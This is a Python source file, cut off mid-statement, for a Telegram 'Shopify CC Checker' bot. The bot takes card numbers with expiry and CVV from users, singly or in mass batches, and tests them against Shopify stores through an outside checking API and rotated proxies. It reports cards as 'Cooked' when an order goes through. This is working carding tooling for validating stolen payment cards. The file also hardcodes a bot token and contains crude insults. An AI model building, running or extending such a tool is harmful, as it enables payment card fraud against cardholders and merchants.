import os
import re
import json
import random
import time
import requests
import telebot
from telebot import types
from datetime import datetime, timedelta
import threading
import functools

BOT_TOKEN = "8366908268:AAG3VFc2U72OeYe-CALOYaHgekgNj-0FHmQ"

OWNER_ID = [7577002994, 1614278744]
DARKS_ID = 7577002994
OWNER_USERNAME = "@IaSDark"

# Limits configuration
NON_APPROVED_MASS_LIMIT = 10
APPROVED_MASS_LIMIT = 50
FLOOD_WAIT_TIME = 10  # seconds

bot = telebot.TeleBot(BOT_TOKEN)

# Load data (move this AFTER all function definitions)
# File paths (ADD THESE AT THE TOP)
SITES_FILE = "sites.json"
PROXIES_FILE = "proxies.json"
STATS_FILE = "stats.json"
SETTINGS_FILE = "settings.json"
USERS_FILE = "users.json"
BAN_FILE = "banned.json"
FLOOD_FILE = "flood.json"

# Set the global price filter AFTER loading settings


BOT_START_TIME = time.time()


# User tracking for flood control and bans
user_last_command = {}
user_bin_attempts = {}

def load_json(file_path, default_data):
    if os.path.exists(file_path):
        try:
            with open(file_path, 'r') as f:
                data = json.load(f)
                return data
        except:
            return default_data
    return default_data

def save_json(file_path, data):
    with open(file_path, 'w') as f:
        json.dump(data, f, indent=4)

# Load data with proper default values
default_stats = {
    "approved": 0, 
    "declined": 0, 
    "cooked": 0, 
    "mass_approved": 0, 
    "mass_declined": 0, 
    "mass_cooked": 0
}
# MOVE THIS ENTIRE SECTION to after all function definitions (around line 120)
# Load data (move this AFTER all function definitions)
sites_data = load_json(SITES_FILE, {"sites": []})
proxies_data = load_json(PROXIES_FILE, {"proxies": []})
stats_data = load_json(STATS_FILE, default_stats)
settings_data = load_json(SETTINGS_FILE, {"price_filter": None})
users_data = load_json(USERS_FILE, {"approved_users": [], "subscriptions": {}})
banned_data = load_json(BAN_FILE, {"banned_users": {}, "bin_bans": {}})
flood_data = load_json(FLOOD_FILE, {})

# Set the global price filter AFTER loading settings
price_filter = settings_data.get("price_filter")

status_emoji = {
    'APPROVED': '🔥',
    'APPROVED_OTP': '✅',
    'DECLINED': '❌',
    'EXPIRED': '👋',
    'ERROR': '⚠️'
}

status_text = {
    'APPROVED': '𝐂𝐨𝐨𝐤𝐞𝐝',
    'APPROVED_OTP': '𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝',
    'DECLINED': '𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝',
    'EXPIRED': '𝐄𝐱𝐩𝐢𝐫𝐞𝐝',
    'ERROR': '𝐄𝐫𝐫𝐨𝐫'
}

# Check if user is owner
def is_owner(user_id):
    return user_id in OWNER_ID

# Check if user is approved
def is_approved(user_id):
    return user_id in users_data["approved_users"] or is_owner(user_id)

# Check if user is banned
def is_banned(user_id):
    if str(user_id) in banned_data["banned_users"]:
        ban_time = banned_data["banned_users"][str(user_id)]
        if time.time() < ban_time:
            return True
        else:
            # Remove expired ban
            del banned_data["banned_users"][str(user_id)]
            save_json(BAN_FILE, banned_data)
    return False

# Check if user is bin banned
def is_bin_banned(user_id):
    if str(user_id) in banned_data["bin_bans"]:
        ban_time = banned_data["bin_bans"][str(user_id)]
        if time.time() < ban_time:
            return True
        else:
            # Remove expired ban
            del banned_data["bin_bans"][str(user_id)]
            save_json(BAN_FILE, banned_data)
    return False

def process_add_sites(message):
    # Reload sites data to ensure we have current data
    global sites_data
    sites_data = load_json(SITES_FILE, {"sites": []})
    
    if len(message.text.split()) < 2:
        bot.reply_to(message, "Please provide URLs to add. Format: /addurls <url1> <url2> ...")
        return

# Check flood control
def check_flood(user_id):
    if is_approved(user_id):
        return False  # No flood control for approved users
    
    current_time = time.time()
    if user_id in flood_data:
        last_time = flood_data[user_id]
        if current_time - last_time < FLOOD_WAIT_TIME:
            return True
    flood_data[user_id] = current_time
    save_json(FLOOD_FILE, flood_data)
    return False

# Check if bot can be used in the chat
def can_use_bot(chat_id, user_id):
    if is_owner(user_id) or is_approved(user_id):
        return True
    
    try:
        chat_member = bot.get_chat_member(chat_id, DARKS_ID)
        return chat_member.status in ['administrator', 'creator', 'member']
    except:
        return False

# Extract CC from various formats
def extract_cc(text):
    # Remove any non-digit characters except |, :, ., /, and space
    cleaned = re.sub(r'[^\d|:./ ]', '', text)
    
    # Handle various formats
    if '|' in cleaned:
        parts = cleaned.split('|')
    elif ':' in cleaned:
        parts = cleaned.split(':')
    elif '.' in cleaned:
        parts = cleaned.split('.')
    elif '/' in cleaned:
        parts = cleaned.split('/')
    else:
        # Handle raw numbers (e.g., 42424242424242421234991234)
        if len(cleaned) >= 16:
            cc = cleaned[:16]
            rest = cleaned[16:]
            if len(rest) >= 4:
                mm = rest[:2]
                rest = rest[2:]
                if len(rest) >= 4:
                    yyyy = rest[:4] if len(rest) >= 4 else rest[:2]
                    rest = rest[4:] if len(rest) >= 4 else rest[2:]
                    if len(rest) >= 3:
                        cvv = rest[:3]
                        parts = [cc, mm, yyyy, cvv]
    
    if len(parts) < 4:
        return None
    
    # Standardize the format
    cc = parts[0].strip()
    mm = parts[1].strip().zfill(2)  # Ensure 2-digit month
    yyyy = parts[2].strip()
    cvv = parts[3].strip()
    
    # Handle 2-digit year - FIXED LOGIC
    if len(yyyy) == 2:
        current_year_short = datetime.now().year % 100
        year_int = int(yyyy)
        # If 2-digit year is less than or equal to current year, assume 2000s
        # Otherwise assume 1900s (for expired cards)
        yyyy = f"20{yyyy}" if year_int >= current_year_short else f"19{yyyy}"
    
    return f"{cc}|{mm}|{yyyy}|{cvv}"

# Extract multiple CCs from text
def extract_multiple_ccs(text):
    # Split by newlines or other common separators
    lines = re.split(r'[\n\r,;]+', text)
    ccs = []
    
    for line in lines:
        cc = extract_cc(line)
        if cc:
            ccs.append(cc)
    
    return ccs

# Get bin info
def get_bin_info(card_number):
    # Clean the card number (remove any non-digit characters)
    card_number = re.sub(r'\D', '', card_number)
    
    # Get the first 6 digits for BIN
    if len(card_number) < 6:
        return None
        
    bin_code = card_number[:6]
    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_code}", timeout=10)
        if response.status_code == 200:
            return response.json()
    except:
        pass
    return None

# Check site with API
def check_site(site, cc, proxy=None):
    url = f"https://shopify.stormx.pw/index.php?site={site}&cc={cc}"
    if proxy:
        url += f"&proxy={proxy}"
    
    try:
        response = requests.get(url, timeout=15)
        if response.status_code == 200:
            return response.json()
    except:
        pass
    return None

# Check if response is valid
def is_valid_response(response):
    if not response:
        return False
    
    response_upper = response.get("Response", "").upper()
    # Check if response is valid
    return any(x in response_upper for x in ['CARD_DECLINED', '3D', 'THANK YOU', 'EXPIRED_CARD', 
                                           'EXPIRE_CARD', 'EXPIRED', 'INSUFFICIENT_FUNDS', 
                                           'INCORRECT_CVC', 'INCORRECT_ZIP', 'FRAUD_SUSPECTED' , "INCORRECT_NUMBER"])

# Process API response
def process_response(api_response, price):
    if not api_response:
        return "ERROR", "API_ERROR", "Unknown"
    
    response_upper = api_response.get("Response", "").upper()
    gateway = api_response.get("Gateway", "Normal")
    
    if 'THANK YOU' in response_upper:
        response = 'ORDER CONFIRM!'
        status = 'APPROVED'
    elif '3D' in response_upper:
        response = 'OTP_REQUIRED'
        status = 'APPROVED_OTP'
    elif any(x in response_upper for x in ['EXPIRED_CARD', 'EXPIRE_CARD', 'EXPIRED']):
        response = 'EXPIRE_CARD'
        status = 'EXPIRED'
    elif any(x in response_upper for x in ['INSUFFICIENT_FUNDS', 'INCORRECT_CVC', 'INCORRECT_ZIP']):
        response = response_upper
        status = 'APPROVED_OTP'
    elif 'CARD_DECLINED' in response_upper:
        response = 'CARD_DECLINED'
        status = 'DECLINED'
    elif 'INCORRECT_NUMBER' in response_upper:  
        response = 'INCORRECT_NUMBER'
        status = 'DECLINED'
    elif 'FRAUD_SUSPECTED' in response_upper:  
        response = 'FRAUD_SUSPECTED'
        status = 'DECLINED'
    else:
        response = response_upper
        status = 'DECLINED'
    
    return response, status, gateway

def format_message(cc, response, status, gateway, price, bin_info, user_id, full_name, time_taken):
    emoji = status_emoji.get(status, '⚠️')
    status_msg = status_text.get(status, '𝐄𝐫𝐫𝐨𝐫')
    
    # Extract card details
    cc_parts = cc.split('|')
    card_number = cc_parts[0]
    
    # Get bin info if available
    if bin_info:
        card_info = bin_info.get('brand', 'UNKNOWN') + ' ' + bin_info.get('type', 'UNKNOWN')
        issuer = bin_info.get('bank', 'UNKNOWN')
        country = bin_info.get('country_name', 'UNKNOWN')
        flag = bin_info.get('country_flag', '🇺🇳')
    else:
        card_info = 'UNKNOWN'
        issuer = 'UNKNOWN'
        country = 'UNKNOWN'
        flag = '🇺🇳'
    
    # Make clickable mention
    safe_name = full_name.replace("<", "").replace(">", "")  # avoid HTML issues
    user_mention = f'<a href="tg://user?id={user_id}">{safe_name}</a>'
    
    message = f"""
┏━━━━━━━⍟
┃ <strong>{status_msg}</strong> {emoji}
┗━━━━━━━━━━━⊛

[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐂𝐚𝐫𝐝</strong>↣<code>{cc}</code>
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</strong>↣{gateway} [{price}$]
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</strong>↣ <code>{response}</code>
━━━━━━━━━━━━━━━━━━━
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐁𝐫𝐚𝐧𝐝</strong>↣{card_info}
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐁𝐚𝐧𝐤</strong>↣{issuer}
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐂𝐨𝐮𝐧𝐭𝐫𝐲</strong>↣{country} {flag}
━━━━━━━━━━━━━━━━━━━
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲</strong>↣ {user_mention}
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐁𝐨𝐭 𝐁𝐲</strong>↣ <a href="tg://user?id={DARKS_ID}">⏤‌‌𝐃𝐚𝐫𝐤𝐛𝐨𝐲 ꯭𖠌</a>
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐓𝐢𝐦𝐞</strong>↣ {time_taken} <strong>𝐬𝐞𝐜𝐨𝐧𝐝𝐬</strong>
"""
    return message

# Format mass check message
def format_mass_message(cc, response, status, gateway, price, index, total):
    emoji = status_emoji.get(status, '⚠️')
    status_msg = status_text.get(status, '𝐄𝐫𝐫𝐨𝐫')
    
    # Extract card details (mask for security)
    cc_parts = cc.split('|')
    masked_cc = f"{cc_parts[0][:6]}******{cc_parts[0][-4:]}|{cc_parts[1]}|{cc_parts[2]}|{cc_parts[3]}"
    
    message = f"""
┏━━━━━━━⍟
┃ <strong>{status_msg}</strong> {emoji} <strong>•</strong> {index}/{total}
┗━━━━━━━━━━━⊛

[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐂𝐚𝐫𝐓</strong>↣<code>{masked_cc}</code>
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</strong>↣{gateway} [{price}$]
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</strong>↣ <code>{response}</code>
━━━━━━━━━━━━━━━━━━━
"""
    return message

# Update stats
def update_stats(status, mass_check=False):
    if status == 'APPROVED':
        if mass_check:
            stats_data['mass_cooked'] += 1
        else:
            stats_data['cooked'] += 1
    elif status in ['APPROVED', 'APPROVED_OTP']:
        if mass_check:
            stats_data['mass_approved'] += 1
        else:
            stats_data['approved'] += 1
    elif status in ['DECLINED', 'EXPIRED', 'ERROR']:
        if mass_check:
            stats_data['mass_declined'] += 1
        else:
            stats_data['declined'] += 1
    
    save_json(STATS_FILE, stats_data)

# Get sites based on price filter
def get_filtered_sites():
    global price_filter
    if not price_filter:
        return sites_data['sites']
    
    try:
        max_price = float(price_filter)
        return [site for site in sites_data['sites'] if float(site.get('price', 0)) <= max_price]
    except:
        return sites_data['sites']

# Check for bin abuse
def check_bin_abuse(user_id, ccs):
    if is_approved(user_id):
        return False  # Approved users are exempt
    
    bin_counts = {}
    for cc in ccs:
        card_number = cc.split('|')[0]
        bin_code = card_number[:6]
        bin_counts[bin_code] = bin_counts.get(bin_code, 0) + 1
    
    # If more than 70% of cards have the same BIN, consider it abuse
    total_cards = len(ccs)
    for bin_code, count in bin_counts.items():
        if count / total_cards > 0.7:
            # Ban user for 24 hours
            ban_until = time.time() + 24 * 60 * 60  # 24 hours
            banned_data["bin_bans"][str(user_id)] = ban_until
            save_json(BAN_FILE, banned_data)
            return True
    
    return False

# Command handlers with DM lock and permission checks
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    # Check if it's a private message
    if message.chat.type == 'private':
        # Check if user is approved or owner
        if not is_approved(message.from_user.id) and not is_owner(message.from_user.id):
            bot.reply_to(message, "❌ This bot is locked for private messages. Please use it in groups where the owner is present.")
            return
    
    help_text = """
Welcome to Shopify CC Checker Bot!

Available Commands:
• /sh CC|MM|YYYY|CVV - Check a card
• /s CC|MM|YYYY|CVV - Short command for checking
• .sh CC|MM|YYYY|CVV - Alternative command
• .s CC|MM|YYYY|CVV - Alternative command
• cook CC|MM|YYYY|CVV - Alternative command

Mass Check Commands:
• /msh CCs - Check multiple cards
• .msh CCs - Alternative command
• hardcook CCs - Alternative command

Owner Commands:
• /addurls <urls> - Add multiple sites
• /addpro <proxy> - Add a proxy
• /clean - Clean invalid sites
• /cleanpro - Clean invalid proxies
• /rmsites - Remove all sites
• /rmpro - Remove all proxies
• /stats - Show bot statistics
• /viewsites - View all sites
• /ping - Check bot response time
• /restart - Restart the bot (owner only)
• /setamo - Set price filter for checking
• /subs <user_id> <days> - Subscribe user
• /unsub <user_id> - Remove user subscription
"""
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['sh' , 's'])
@bot.message_handler(func=lambda m: m.text and (m.text.startswith('.sh') or m.text.startswith('.s') or m.text.lower().startswith('cook')))
def handle_cc_check(message):
    # Check DM lock
    if message.chat.type == 'private' and not is_approved(message.from_user.id) and not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ This bot is locked for private messages. Please use it in groups where the owner is present.")
        return
    
    # Check if bot can be used in this chat
    if not can_use_bot(message.chat.id, message.from_user.id):
        bot.reply_to(message, f"❌ Please add {OWNER_USERNAME} to this group to use the bot.")
        return
    
    # Check if user is banned
    if is_banned(message.from_user.id):
        bot.reply_to(message, "❌ You are temporarily banned from using this bot.")
        return
    
    # Check flood control
    if check_flood(message.from_user.id):
        bot.reply_to(message, f"⏳ Please wait {FLOOD_WAIT_TIME} seconds between commands.")
        return
    
    # Run in a separate thread to avoid blocking
    thread = threading.Thread(target=process_cc_check, args=(message,))
    thread.start()

def process_cc_check(message):
    # Check if command has CC or is a reply to a message with CC
    cc_text = None
    
    # Extract command text properly
    if message.text.startswith(('/sh', '/s', '.sh', '.s', 'cook', 'Cook')):
        parts = message.text.split(maxsplit=1)
        if len(parts) > 1:
            cc_text = parts[1]
    
    # If no CC in command text, check if it's a reply
    if not cc_text and message.reply_to_message:
        cc_text = message.reply_to_message.text
    
    if not cc_text:
        bot.reply_to(message, "Please provide a CC in format: /sh CC|MM|YYYY|CVV or reply to a message with CC.")
        return
    
    # Extract CC from text
    cc = extract_cc(cc_text)
    if not cc:
        bot.reply_to(message, "Invalid CC format. Please use CC|MM|YYYY|CVV format.")
        return
    
    # Send initial message
    processing_msg = bot.reply_to(message, "𝐂𝐨𝐨𝐤𝐢𝐧𝐠 𝐘𝐨𝐮𝐫 𝐎𝐫𝐝𝐞𝐫. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 🔥")
    
    # Get bin info from the extracted CC (not the original text)
    card_number = cc.split('|')[0]
    bin_info = get_bin_info(card_number)
    
    # Get random proxy
    proxy = random.choice(proxies_data['proxies']) if proxies_data['proxies'] else None
    
    # Get filtered sites based on price filter
    filtered_sites = get_filtered_sites()
    
    if not filtered_sites:
        bot.edit_message_text("No sites available. Please add sites first.", 
                             chat_id=message.chat.id, 
                             message_id=processing_msg.message_id)
        return
    
    # Start timer
    start_time = time.time()
    
    # Try multiple sites until we get a valid response
    max_retries = min(5, len(filtered_sites))  # Try up to 5 sites
    sites_tried = 0
    api_response = None
    site_obj = None
    
    # Shuffle sites to try different ones each time
    shuffled_sites = filtered_sites.copy()
    random.shuffle(shuffled_sites)
    
    for i, current_site_obj in enumerate(shuffled_sites[:max_retries]):
        sites_tried += 1
        site = current_site_obj['url']
        price = current_site_obj.get('price', '0.00')
        
        # Update status if trying multiple sites
        if i > 0:
            try:
                bot.edit_message_text(
                    f"𝐒𝐢𝐭𝐞 𝐃𝐞𝐚𝐝 🚫\n𝐋𝐞𝐭'𝐬 𝐂𝐨𝐨𝐤 𝐖𝐢𝐭𝐡 𝐀𝐧𝐨𝐭𝐡𝐞𝐫 𝐒𝐢𝐭𝐞 🔥\n\n𝐓𝐫𝐲𝐢𝐧𝐢𝐠 𝐒𝐢𝐭𝐞 {i+1}/{max_retries}",
                    chat_id=message.chat.id,
                    message_id=processing_msg.message_id
                )
            except:
                pass
        
        # Check site
        api_response = check_site(site, cc, proxy)
        
        # If we got a valid response, use this site
        if is_valid_response(api_response):
            site_obj = current_site_obj
            break
        
        # Small delay between site attempts
        time.sleep(1)
    
    # If no site worked, use the last one tried
    if not site_obj and shuffled_sites:
        site_obj = shuffled_sites[min(sites_tried-1, len(shuffled_sites)-1)]
        price = current_site_obj.get('price', '0.00')
    
    
    # Calculate time taken
    time_taken = round(time.time() - start_time, 2)
    
    # Process response
    response, status, gateway = process_response(api_response, price)
    
    # Update stats
    update_stats(status)
    
    # Get user full name properly
    first = message.from_user.first_name or ""
    last = message.from_user.last_name or ""
    full_name = f"{first} {last}".strip()
    
    # Format final message with clickable full name
    final_message = format_message(
        cc, response, status, gateway, price, bin_info,
        message.from_user.id, full_name, time_taken
    )
    
    # Edit the processing message with result
    bot.edit_message_text(
        final_message,
        chat_id=message.chat.id,
        message_id=processing_msg.message_id,
        parse_mode='HTML'
    )

# MASS CHECK HANDLER
@bot.message_handler(commands=['msh'])
@bot.message_handler(func=lambda m: m.text and (m.text.startswith('.msh') or m.text.lower().startswith('hardcook')))
def handle_mass_check(message):
    # Check DM lock
    if message.chat.type == 'private' and not is_approved(message.from_user.id) and not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ This bot is locked for private messages. Please use it in groups where the owner is present.")
        return
    
    # Check if bot can be used in this chat
    if not can_use_bot(message.chat.id, message.from_user.id):
        bot.reply_to(message, f"❌ Please add {OWNER_USERNAME} to this group to use the bot.")
        return
    
    # Check if user is banned
    if is_banned(message.from_user.id):
        bot.reply_to(message, "❌ You are temporarily banned from using this bot.")
        return
    
    # Check bin ban
    if is_bin_banned(message.from_user.id):
        bot.reply_to(message, "maa chuda 24 hours k liye ab")
        return
    
    # Check flood control
    if check_flood(message.from_user.id):
        bot.reply_to(message, f"⏳ Please wait {FLOOD_WAIT_TIME} seconds between commands.")
        return
    
    # Run in a separate thread to avoid blocking
    thread = threading.Thread(target=process_mass_check, args=(message,))
    thread.start()

def format_mass_response(results, total_cards, current_count, gateway, price):
    approved = sum(1 for r in results if r['status'] in ['APPROVED', 'APPROVED_OTP'])
    cooked = sum(1 for r in results if r['status'] == 'APPROVED')
    declined = sum(1 for r in results if r['status'] in ['DECLINED', 'EXPIRED'])
    errors = sum(1 for r in results if r['status'] == 'ERROR')
    
    response = f"""
┏━━━━━━━⍟
┃ <strong>𝐌𝐚𝐬𝐬 𝐂𝐨𝐨𝐤𝐢𝐧𝐠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</strong> 🔥
┗━━━━━━━━━━━⊛

[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐓𝐨𝐭𝐚𝐥</strong>↣{current_count}/{total_cards}
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝</strong>↣{approved}  
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐂𝐨𝐨𝐤𝐞𝐝</strong>↣{cooked}
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝</strong>↣{declined}
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐄𝐫𝐫𝐨𝐫𝐬</strong>↣{errors}
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</strong>↣{gateway} [{price}$]

━━━━━━━━━━━━━━━━━━━
"""
    
    for result in results:
        emoji = status_emoji.get(result['status'], '⚠️')
        status_msg = status_text.get(result['status'], '𝐄𝐫𝐫𝐨𝐫')
        response += f"<code>{result['cc']}</code>\n{status_msg} {emoji} - {result['response']}\n━━━━━━━━━━━━━━━━━━━\n"
    
    response += f"\n[<a href='https://t.me/stormxvup'>⌬</a>] <strong>𝐁𝐨𝐭 𝐁𝐲</strong>↣ <a href='tg://user?id={DARKS_ID}'>⏤‌‌𝐃𝐚𝐫𝐤𝐛𝐨𝐲 ꯭𖠌</a>"
    
    return response

def process_mass_check(message):
    # Check if command has CCs or is a reply to a message with CCs
    ccs_text = None
    
    # Extract command text properly
    if message.text.startswith(('/msh', '.msh', 'hardcook', 'Hardcook')):
        parts = message.text.split(maxsplit=1)
        if len(parts) > 1:
            ccs_text = parts[1]
    
    # If no CCs in command text, check if it's a reply
    if not ccs_text and message.reply_to_message and message.reply_to_message.text:
        ccs_text = message.reply_to_message.text
    
    if not ccs_text:
        bot.reply_to(message, "Please provide CCs in format: /msh CC|MM|YYYY|CVV\nCC|MM|YYYY|CVV... or reply to a message with CCs.")
        return
    
    # Extract multiple CCs from text
    ccs = extract_multiple_ccs(ccs_text)
    
    if not ccs:
        bot.reply_to(message, "No valid CCs found. Please use CC|MM|YYYY|CVV format.")
        return
    
    # Set limit based on user status
    if is_approved(message.from_user.id):
        max_limit = APPROVED_MASS_LIMIT
    else:
        max_limit = NON_APPROVED_MASS_LIMIT
    
    if len(ccs) > max_limit:
        ccs = ccs[:max_limit]
        bot.reply_to(message, f"⚠️ Limited to {max_limit} cards (your limit).")
    
    # Check for bin abuse
    if check_bin_abuse(message.from_user.id, ccs):
        bot.reply_to(message, "maa chuda 24 hours k liye ab")
        return
    
    # Send initial message
    processing_msg = bot.reply_to(message, "𝐌𝐚𝐬𝐬 𝐂𝐨𝐨𝐤𝐢𝐧𝐠 𝐈𝐧𝐢𝐭𝐢𝐚𝐭𝐞𝐝 🔥\n\n𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭...")
    
    # Get random proxy
    proxy = random.choice(proxies_data['proxies']) if proxies_data['proxies'] else None
    
    # Get filtered sites based on price filter
    filtered_sites = get_filtered_sites()
    
    if not filtered_sites:
        bot.edit_message_text("No sites available. Please add sites first.", 
                             chat_id=message.chat.id, 
                             message_id=processing_msg.message_id)
        return
    
    # Prepare results list
    results = []
    total_cards = len(ccs)
    start_time = time.time()
    
    # Start processing each card
    for index, cc in enumerate(ccs):
        # Try multiple sites until we get a valid response
        max_retries = min(3, len(filtered_sites))  # Try up to 3 sites for mass check
        api_response = None
        site_obj = None
        gateway = "Unknown"
        price = "0.00"
        
        # Shuffle sites to try different ones each time
        shuffled_sites = filtered_sites.copy()
        random.shuffle(shuffled_sites)
        
        for i, current_site_obj in enumerate(shuffled_sites[:max_retries]):
            site = current_site_obj['url']
            price = current_site_obj.get('price', '0.00')
            
            # Check site
            api_response = check_site(site, cc, proxy)
            
            # If we got a valid response, use this site
            if is_valid_response(api_response):
                site_obj = current_site_obj
                gateway = api_response.get("Gateway", "Unknown")
                break
            
            # Small delay between site attempts
            time.sleep(0.5)
        
        # If no site worked, use the last one tried
        if not site_obj and shuffled_sites:
            site_obj = shuffled_sites[min(len(shuffled_sites)-1, len(shuffled_sites)-1)]
            price = site_obj.get('price', '0.00')
        
        # Process response
        response, status, gateway = process_response(api_response, price)
        
        # Update stats
        update_stats(status, mass_check=True)
        
        # Add to results
        results.append({
            'cc': cc,
            'response': response,
            'status': status,
            'gateway': gateway,
            'price': price
        })
        
        # Update live results
        current_count = index + 1
        processing_time = time.time() - start_time
        
        try:
            response_text = format_mass_response(results, total_cards, current_count, gateway, price)
            bot.edit_message_text(
                response_text,
                chat_id=message.chat.id,
                message_id=processing_msg.message_id,
                parse_mode='HTML'
            )
        except:
            pass
        
        # Small delay between card checks
        time.sleep(1)
    
    # Final update with completion
    processing_time = time.time() - start_time
    final_response = f"""
┏━━━━━━━⍟
┃ <strong>𝐌𝐚𝐬𝐬 𝐂𝐨𝐨𝐤𝐢𝐧𝐠 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝!</strong> 🔥
┗━━━━━━━━━━━⊛

[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐓𝐨𝐭𝐚𝐥 𝐂𝐚𝐫𝐝𝐬</strong>↣{total_cards}
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧</strong>↣{processing_time:.2f}𝐬
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</strong>↣{gateway} [{price}$]

━━━━━━━━━━━━━━━━━━━
"""
    
    approved = sum(1 for r in results if r['status'] in ['APPROVED', 'APPROVED_OTP'])
    cooked = sum(1 for r in results if r['status'] == 'APPROVED')
    declined = sum(1 for r in results if r['status'] in ['DECLINED', 'EXPIRED'])
    errors = sum(1 for r in results if r['status'] == 'ERROR')
    
    final_response += f"""
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝</strong>↣{approved} ✅
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐂𝐨𝐨𝐤𝐞𝐝</strong>↣{cooked} 🔥  
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐃𝐞𝐜𝐜𝐥𝐢𝐧𝐞𝐓 ❌</strong>↣{declined}
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐄𝐫𝐫𝐨𝐫𝐬</strong>↣{errors} ⚠️

━━━━━━━━━━━━━━━━━━━
"""
    
    for result in results:
        emoji = status_emoji.get(result['status'], '⚠️')
        status_msg = status_text.get(result['status'], '𝐄𝐫𝐫𝐨𝐫')
        final_response += f"<code>{result['cc']}</code>\n{status_msg} {emoji} - {result['response']}\n━━━━━━━━━━━━━━━━━━━\n"
    
    final_response += f"\n[<a href='https://t.me/stormxvup'>⌬</a>] <strong>𝐁𝐨𝐭 𝐁𝐲</strong>↣ <a href='tg://user?id={DARKS_ID}'>⏤‌‌𝐃𝐚𝐫𝐤𝐛𝐨𝐲 ꯭𖠌</a>"
    
    bot.edit_message_text(
        final_response,
        chat_id=message.chat.id,
        message_id=processing_msg.message_id,
        parse_mode='HTML'
    )

def extract_urls(text):
    """
    Extract valid URLs from text that might contain jumbled/waste characters
    """
    # Split the text and look for potential URLs
    parts = text.split()
    potential_urls = []
    
    # Remove the command itself
    if parts and parts[0] == '/addurls':
        parts = parts[1:]
    
    # Try to find URLs in each part
    for part in parts:
        # Clean the part by removing non-URL characters from start/end
        cleaned = clean_string(part)
        
        # Check if it looks like a URL
        if is_likely_url(cleaned):
            # Ensure it has a scheme
            if not cleaned.startswith(('http://', 'https://')):
                cleaned = 'https://' + cleaned
            potential_urls.append(cleaned)
    
    return potential_urls

def clean_string(s):
    """
    Remove junk characters from the start and end of a string
    """
    # Remove non-alphanumeric characters from start
    while s and not s[0].isalnum():
        s = s[1:]
    
    # Remove non-alphanumeric characters from end
    while s and not s[-1].isalnum():
        s = s[:-1]
    
    return s

def is_likely_url(s):
    """
    Check if a string is likely to be a URL
    """
    # Check for common TLDs
    tlds = ['.com', '.org', '.net', '.io', '.gov', '.edu', '.info', '.co', '.uk', '.us', '.ca', '.au', '.de', '.fr']
    
    # Check if it contains a TLD
    has_tld = any(tld in s for tld in tlds)
    
    # Check if it has a domain structure
    has_domain_structure = '.' in s and len(s.split('.')) >= 2
    
    # Check if it's not too short
    not_too_short = len(s) > 4
    
    return (has_tld or has_domain_structure) and not_too_short

@bot.message_handler(commands=['addurls'])
def handle_add_sites(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Jhant Bhar ka Admi asa kr kaise sakta hai..")
        return
    
    # Run in a separate thread to avoid blocking
    thread = threading.Thread(target=process_add_sites, args=(message,))  # Fix: message instead of mesge
    thread.start()

def process_add_sites(message):
    if len(message.text.split()) < 2:
        bot.reply_to(message, "Please provide URLs to add. Format: /addurls <url1> <url2> ...")
        return
    
    # Extract and clean URLs from the message
    raw_text = message.text
    urls = extract_urls(raw_text)
    
    if not urls:
        bot.reply_to(message, "No valid URLs found in your message.")
        return
    
    added_count = 0
    total_count = len(urls)
    
    # Send initial processing message
    status_msg = bot.reply_to(message, f"🔍 Checking {total_count} sites...\n\nAdded: 0/{total_count}\nSkipped: 0/{total_count}")
    
    skipped_count = 0
    
    for i, url in enumerate(urls):
        # Update status message
        try:
            bot.edit_message_text(
                f"🔍 Checking {total_count} sites...\n\nChecking: {url}\nAdded: {added_count}/{total_count}\nSkipped: {skipped_count}/{total_count}",
                chat_id=message.chat.id,
                message_id=status_msg.message_id
            )
        except:
            pass
        
        # Test the URL with a sample card
        test_cc = "5242430428405662|03|28|323"
        response = check_site(url, test_cc)
        
        if response:
            response_upper = response.get("Response", "").upper()
            # Check if response is valid
            if any(x in response_upper for x in ['CARD_DECLINED', '3D', 'THANK YOU', 'EXPIRED_CARD', 
